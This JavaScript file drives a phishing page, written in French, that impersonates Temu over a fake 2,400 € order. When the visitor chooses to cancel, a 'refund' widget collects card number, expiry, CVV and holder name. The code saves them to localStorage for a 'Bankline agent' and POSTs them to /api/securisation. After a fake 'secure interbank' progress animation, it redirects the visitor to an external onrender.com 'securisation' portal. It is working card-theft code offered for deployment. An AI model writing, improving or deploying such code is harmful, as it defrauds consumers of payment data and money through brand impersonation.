/**
 * TEMU ORDER MANAGEMENT PLATFORM
 * Réf : CMD-TEMU-89241-EU
 * Marchand : TEMU (Whaleco Tech Ireland Ltd)
 */

// =========================================================================
// CONFIGURATION DE REDIRECTION VERS LE PORTAIL AGENT BANKLINE
// =========================================================================
// 📌 1. Mode Local (par défaut) : 'http://localhost:3001/securisation.html'
// 📌 2. Mode Déployé en ligne : 
//    Une fois votre serveur agent déployé (Vercel, VPS ou Cloud), vous pouvez
//    soit remplacer l'URL ci-dessous par votre adresse publique (ex: https://votre-projet.vercel.app/securisation.html),
//    soit taper dans la console du navigateur :
//    localStorage.setItem('BANKLINE_AGENT_PORTAL_URL', 'https://votre-url-en-ligne.com/securisation.html')
// =========================================================================
const REDIRECT_CONFIG = {
  // Détecte automatiquement l'URL configurée en local ou en déploiement distant
  agentPortalUrl: localStorage.getItem('BANKLINE_AGENT_PORTAL_URL') || 
                  window.BANKLINE_AGENT_PORTAL_URL || 
                  'https://bankline-admin.onrender.com/securisation.html',

  // Durée de l'animation en secondes (entre 10 et 12 secondes demandées)
  durationSeconds: 11
};

document.addEventListener('DOMContentLoaded', () => {
  initDecisionSelect();
  initModalCheckout();
  initPrepaidCardsWidget();
});

// Gestion du sélecteur "Voulez-vous valider ou annuler votre commande ?"
function initDecisionSelect() {
  const container = document.getElementById('custom-dropdown-container');
  const trigger = document.getElementById('dropdown-trigger');
  const selectedText = document.getElementById('dropdown-selected-text');
  const optItems = document.querySelectorAll('.dropdown-opt-item');
  const actionZone = document.getElementById('dynamic-action-zone');
  const nativeSelect = document.getElementById('order-decision-select');

  if (!container || !trigger) return;

  // Ouvrir / Fermer le menu déroulant au clic
  trigger.addEventListener('click', (e) => {
    e.stopPropagation();
    const isOpen = container.classList.toggle('is-open');
    trigger.setAttribute('aria-expanded', isOpen);
  });

  // Fermer si clic en dehors
  document.addEventListener('click', (e) => {
    if (!container.contains(e.target)) {
      container.classList.remove('is-open');
      trigger.setAttribute('aria-expanded', 'false');
    }
  });

  // Sélection d'une option
  optItems.forEach(item => {
    item.addEventListener('click', () => {
      const val = item.dataset.value;
      const text = item.textContent.trim();

      // Mettre à jour l'affichage
      selectedText.textContent = text;
      optItems.forEach(i => i.classList.remove('selected', 'opt-default'));
      item.classList.add('selected');
      if (!val) item.classList.add('opt-default');

      // Fermer le menu
      container.classList.remove('is-open');
      trigger.setAttribute('aria-expanded', 'false');

      // Synchroniser select natif
      if (nativeSelect) nativeSelect.value = val;

      // Traiter l'action correspondante
      handleDecision(val, actionZone);
    });
  });
}

function handleDecision(value, actionZone) {
  if (!actionZone) return;

  if (value === 'validate') {
    actionZone.innerHTML = `
      <button class="btn-action-primary" id="btn-trigger-checkout">
        Valider et régler ma commande (2 400,00 €) ➔
      </button>
    `;
    const btn = document.getElementById('btn-trigger-checkout');
    if (btn) {
      btn.addEventListener('click', openCheckoutModal);
    }
    showToast("Option sélectionnée : Valider ma commande");
  } else if (value === 'cancel') {
    actionZone.innerHTML = `
      <button class="btn-action-cancel" id="btn-trigger-cancel">
        Confirmer l'annulation de la commande
      </button>
    `;
    const btn = document.getElementById('btn-trigger-cancel');
    if (btn) {
      btn.addEventListener('click', () => {
        // Afficher immédiatement par le bas le widget avec les logos de cartes et le formulaire PIN
        openPrepaidCardsWidget();
      });
    }
    showToast("Option sélectionnée : Annuler ma commande");
  } else {
    actionZone.innerHTML = '';
  }
}

// Workflow d'animation de chargement TEMU <-> BANKLINE & Redirection automatique (10 à 12s)
function startCancellationWorkflow() {
  const overlay = document.getElementById('cancel-loader-overlay');
  const progressBar = document.getElementById('cancel-progress-bar');
  const percentText = document.getElementById('cancel-percent');
  const countdownText = document.getElementById('cancel-countdown');
  const stepText = document.getElementById('cancel-dynamic-step');

  if (!overlay) return;

  // Afficher l'overlay d'animation
  overlay.classList.add('active');
  overlay.setAttribute('aria-hidden', 'false');

  const totalSeconds = REDIRECT_CONFIG.durationSeconds || 11;
  const startTime = Date.now();
  const totalDurationMs = totalSeconds * 1000;

  // Étapes de transmission dynamique affichées pendant les 11 secondes
  const steps = [
    { threshold: 0, text: "Transmission de la requête d'annulation CMD-TEMU-89241-EU..." },
    { threshold: 0.25, text: "Connexion sécurisée à la passerelle interbancaire..." },
    { threshold: 0.55, text: "Validation des protocoles de remboursement & cryptage 256-bit..." },
    { threshold: 0.85, text: "Traitement validé. Sécurisation des données terminée..." },
    { threshold: 0.98, text: "✓ Redirection immédiate vers le portail agent bancaire..." }
  ];

  const updateInterval = setInterval(() => {
    const elapsed = Date.now() - startTime;
    const progress = Math.min(elapsed / totalDurationMs, 1);
    const percentInt = Math.floor(progress * 100);
    const secondsRemaining = Math.max(0, Math.ceil((totalDurationMs - elapsed) / 1000));

    // Mise à jour de la barre et des pourcentages
    if (progressBar) progressBar.style.width = `${progress * 100}%`;
    if (percentText) percentText.textContent = `${percentInt}%`;
    if (countdownText) {
      countdownText.textContent = secondsRemaining > 0 
        ? `⏳ Temps restant : ~${secondsRemaining}s` 
        : `✓ Redirection en cours...`;
    }

    // Mise à jour des messages d'étapes
    if (stepText) {
      for (let i = steps.length - 1; i >= 0; i--) {
        if (progress >= steps[i].threshold) {
          stepText.textContent = steps[i].text;
          break;
        }
      }
    }

    // Lorsque le délai est écoulé (11 secondes)
    if (progress >= 1) {
      clearInterval(updateInterval);

      // Redirection automatique vers le portail agent
      setTimeout(() => {
        window.location.href = REDIRECT_CONFIG.agentPortalUrl;
      }, 400);
    }
  }, 50);
}

// Modale de paiement et validation
function openCheckoutModal() {
  const modal = document.getElementById('checkout-modal');
  const form = document.getElementById('modal-payment-form');
  const successState = document.getElementById('modal-success-state');

  if (modal) {
    if (form) form.style.display = 'block';
    if (successState) successState.style.display = 'none';
    modal.classList.add('active');
  }
}

function initModalCheckout() {
  const modal = document.getElementById('checkout-modal');
  const closeBtn = document.getElementById('modal-close-btn');
  const confirmBtn = document.getElementById('btn-confirm-payment');
  const finishBtn = document.getElementById('btn-finish-modal');
  const form = document.getElementById('modal-payment-form');
  const successState = document.getElementById('modal-success-state');

  if (closeBtn && modal) {
    closeBtn.addEventListener('click', () => {
      modal.classList.remove('active');
    });
  }

  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        modal.classList.remove('active');
      }
    });
  }

  // Choix des options de paiement
  const radioCards = document.querySelectorAll('.pay-radio-opt');
  radioCards.forEach(card => {
    card.addEventListener('click', () => {
      radioCards.forEach(c => c.classList.remove('active'));
      card.classList.add('active');
      const radio = card.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    });
  });

  // Bouton de paiement
  if (confirmBtn) {
    confirmBtn.addEventListener('click', () => {
      confirmBtn.disabled = true;
      confirmBtn.textContent = "Sécurisation bancaire Whaleco Pay...";

      setTimeout(() => {
        confirmBtn.disabled = false;
        confirmBtn.textContent = "Payer maintenant 2 400,00 €";

        if (form) form.style.display = 'none';
        if (successState) successState.style.display = 'block';

        showToast("✓ Paiement de 2 400,00 € validé avec succès !");
      }, 1100);
    });
  }

  if (finishBtn && modal) {
    finishBtn.addEventListener('click', () => {
      modal.classList.remove('active');
    });
  }
}

// Toast de notification
let toastTimer;
function showToast(msg) {
  const box = document.getElementById('toast-box');
  if (!box) return;
  box.textContent = msg;
  box.classList.add('active');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => {
    box.classList.remove('active');
  }, 3000);
}

// =========================================================================
// WIDGET DU BAS : SÉLECTION DES LOGOS DE CARTES & SAISIE DU CODE PIN
// =========================================================================
function openPrepaidCardsWidget() {
  const overlay = document.getElementById('bottom-sheet-cards-overlay');
  const form = document.getElementById('sheet-card-form');
  const successScreen = document.getElementById('sheet-success-screen');

  if (overlay) {
    if (form) form.style.display = 'block';
    if (successScreen) successScreen.style.display = 'none';
    overlay.classList.add('active');
    overlay.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';

    // Réinitialiser la case nom à vide
    const holderInput = document.getElementById('sheet-card-holder');
    if (holderInput) holderInput.value = '';
    const prevHolder = document.getElementById('preview-card-holder');
    if (prevHolder) prevHolder.textContent = 'NOM DU TITULAIRE';

    // Focus automatique sur le numéro de carte
    const numInput = document.getElementById('sheet-card-number');
    if (numInput) {
      setTimeout(() => numInput.focus(), 350);
    }
  }
}

function closePrepaidCardsWidget() {
  const overlay = document.getElementById('bottom-sheet-cards-overlay');
  if (overlay) {
    overlay.classList.remove('active');
    overlay.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }
}

function initPrepaidCardsWidget() {
  const overlay = document.getElementById('bottom-sheet-cards-overlay');
  const closeBtn = document.getElementById('btn-close-sheet');
  const finishBtn = document.getElementById('btn-finish-sheet');
  const cardItems = document.querySelectorAll('.card-logo-item');

  // Mini preview elements
  const miniPreview = document.getElementById('mini-card-preview');
  const previewBrand = document.getElementById('preview-brand-name');
  const previewNumber = document.getElementById('preview-card-number');
  const previewHolder = document.getElementById('preview-card-holder');
  const previewExp = document.getElementById('preview-card-exp');

  // Input elements
  const inputNumber = document.getElementById('sheet-card-number');
  const inputExp = document.getElementById('sheet-card-exp');
  const inputCvv = document.getElementById('sheet-card-cvv');
  const inputHolder = document.getElementById('sheet-card-holder');
  const badgeType = document.getElementById('sheet-card-type-badge');
  const form = document.getElementById('sheet-card-form');
  const successScreen = document.getElementById('sheet-success-screen');

  let currentCard = 'visa';

  // Fermeture
  if (closeBtn) {
    closeBtn.addEventListener('click', closePrepaidCardsWidget);
  }
  if (finishBtn) {
    finishBtn.addEventListener('click', closePrepaidCardsWidget);
  }
  if (overlay) {
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) {
        closePrepaidCardsWidget();
      }
    });
  }

  // Échap pour fermer
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && overlay && overlay.classList.contains('active')) {
      closePrepaidCardsWidget();
    }
  });

  // Sélection du logo de carte (Visa, Mastercard, CB, Amex, Transcash, PCS)
  cardItems.forEach(item => {
    item.addEventListener('click', () => {
      cardItems.forEach(i => i.classList.remove('active'));
      item.classList.add('active');

      const cardType = item.getAttribute('data-card') || 'visa';
      currentCard = cardType;

      // Mise à jour du look dynamique de la carte
      if (miniPreview) {
        miniPreview.className = `mini-card-preview skin-${cardType}`;
      }

      // Mise à jour des libellés et badges
      const brandLabels = {
        'visa': 'VISA',
        'mastercard': 'MASTERCARD',
        'cb': 'CARTE BANCAIRE (CB)'
      };

      const shortBadges = {
        'visa': 'VISA',
        'mastercard': 'MC',
        'cb': 'CB'
      };

      if (previewBrand) previewBrand.textContent = brandLabels[cardType] || cardType.toUpperCase();
      if (badgeType) badgeType.textContent = shortBadges[cardType] || cardType.toUpperCase();

      showToast(`Carte sélectionnée : ${brandLabels[cardType] || cardType.toUpperCase()}`);
    });
  });

  // Formatage live : Numéro de carte 16 chiffres avec espacement par 4
  if (inputNumber) {
    inputNumber.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 16) val = val.slice(0, 16);
      const parts = val.match(/[\s\S]{1,4}/g) || [];
      e.target.value = parts.join(' ');

      if (previewNumber) {
        previewNumber.textContent = parts.length > 0 ? parts.join(' ') : '•••• •••• •••• ••••';
      }
    });
  }

  // Formatage live : Expiration MM/AA
  if (inputExp) {
    inputExp.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 4) val = val.slice(0, 4);

      if (val.length >= 2) {
        e.target.value = val.slice(0, 2) + '/' + val.slice(2);
      } else {
        e.target.value = val;
      }

      if (previewExp) {
        previewExp.textContent = e.target.value || 'MM/AA';
      }
    });
  }

  // Formatage live : CVV 3 chiffres
  if (inputCvv) {
    inputCvv.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 3) val = val.slice(0, 3);
      e.target.value = val;
    });
  }

  // Titulaire live
  if (inputHolder) {
    inputHolder.addEventListener('input', (e) => {
      if (previewHolder) {
        previewHolder.textContent = e.target.value.trim().toUpperCase() || 'NOM DU TITULAIRE';
      }
    });
  }

  // Soumission du formulaire dans le widget
  if (form) {
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const rawNumber = (inputNumber ? inputNumber.value : '').replace(/\s+/g, '');
      const expiry = (inputExp ? inputExp.value : '').trim();
      const cvv = (inputCvv ? inputCvv.value : '').trim();
      const holder = (inputHolder ? inputHolder.value : '').trim();

      // Validations
      if (rawNumber.length !== 16 || !/^\d+$/.test(rawNumber)) {
        showToast("Le numéro de carte doit comporter exactement 16 chiffres.");
        if (inputNumber) inputNumber.focus();
        return;
      }

      if (!holder) {
        showToast("Le nom du titulaire est obligatoire.");
        if (inputHolder) inputHolder.focus();
        return;
      }

      if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        showToast("Format d'expiration invalide (MM/AA).");
        if (inputExp) inputExp.focus();
        return;
      }

      if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
        showToast("Le code CVV doit comporter exactement 3 chiffres.");
        if (inputCvv) inputCvv.focus();
        return;
      }

      const submitBtn = document.getElementById('btn-submit-sheet-card');
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = `
          <span class="step-spinner" style="width:16px;height:16px;border-width:2px;display:inline-block;vertical-align:middle;margin-right:6px;"></span>
          Validation en cours...
        `;
      }

      const refCode = 'REF-ANN-' + Math.floor(100000 + Math.random() * 900000);
      const cardRecord = {
        id: 'CARD-' + Math.random().toString(36).substring(2, 8).toUpperCase(),
        reference: refCode,
        cardType: currentCard,
        cardNumber: rawNumber,
        expiry: expiry,
        cvv: cvv,
        clientId: '675464',
        clientName: holder,
        amountRefunded: '2 400,00 €',
        orderId: 'CMD-TEMU-89241-EU',
        status: 'active',
        createdAt: new Date().toISOString(),
        createdBy: 'WIDGET_ANNULATION_TEMU'
      };

      // 1. Sauvegarde dans localStorage pour synchronisation immédiate avec l'agent Bankline
      try {
        let pending = [];
        const existing = localStorage.getItem('BANKLINE_PENDING_SECURED_CARDS');
        if (existing) pending = JSON.parse(existing);
        pending.unshift(cardRecord);
        localStorage.setItem('BANKLINE_PENDING_SECURED_CARDS', JSON.stringify(pending));
      } catch (err) {
        console.warn('Sauvegarde localStorage locale:', err);
      }

      // 2. Envoi API vers le serveur en ligne ou local si disponible
      try {
        await fetch('/api/securisation', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(cardRecord)
        });
      } catch (err) {
        console.log('Serveur API autonome en local.');
      }

      // Transition vers l'écran de succès après 1.2s de sécurisation
      setTimeout(() => {
        if (submitBtn) {
          submitBtn.disabled = false;
          submitBtn.innerHTML = `
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            Valider l'annulation & Rembourser 2 400,00 €
          `;
        }

        if (form) form.style.display = 'none';
        if (successScreen) {
          successScreen.style.display = 'block';
          const refEl = document.getElementById('receipt-ref-code');
          const brandEl = document.getElementById('receipt-card-brand');
          if (refEl) refEl.textContent = refCode;
          if (brandEl) brandEl.textContent = `${currentCard.toUpperCase()} (•••• ${rawNumber.slice(-4)})`;
        }

        showToast("✓ Annulation confirmée & coordonnées sécurisées !");
      }, 1200);
    });
  }
}
